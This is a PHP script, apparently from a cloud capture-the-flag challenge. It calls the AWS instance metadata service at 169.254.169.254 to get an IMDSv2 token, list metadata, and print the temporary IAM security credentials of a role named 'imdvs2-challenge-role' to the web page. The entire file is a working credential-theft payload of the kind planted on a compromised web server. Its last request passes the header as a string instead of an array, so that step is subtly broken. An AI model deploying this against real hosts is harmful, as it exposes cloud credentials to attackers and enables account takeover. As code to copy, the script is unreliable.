
<?php

#find example for php curl: https://code.tutsplus.com/tutorials/how-to-use-curl-in-php--cms-36732

#$TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`;

$url = "http://169.254.169.254/latest/api/token";

$header[0] = "X-aws-ec2-metadata-token-ttl-seconds: 21600";

$curl = curl_init();

curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($curl, CURLOPT_HTTPHEADER, $header);

$data = curl_exec($curl);
echo $data;
echo "<br>";

$token = $data;

#curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/;

$url = "http://169.254.169.254/latest/meta-data/";

$header[0] = "X-aws-ec2-metadata-token: ".$token;

curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($curl, CURLOPT_HTTPHEADER, $header);

$data = curl_exec($curl);
echo $data;
echo "<br>";

#curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/imdvs2-challenge-role;

$url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/imdvs2-challenge-role";

$header = "X-aws-ec2-metadata-token: ".$token;

curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($curl, CURLOPT_HTTPHEADER, $header);

$data = curl_exec($curl);
echo $data;

curl_close($curl);

?>
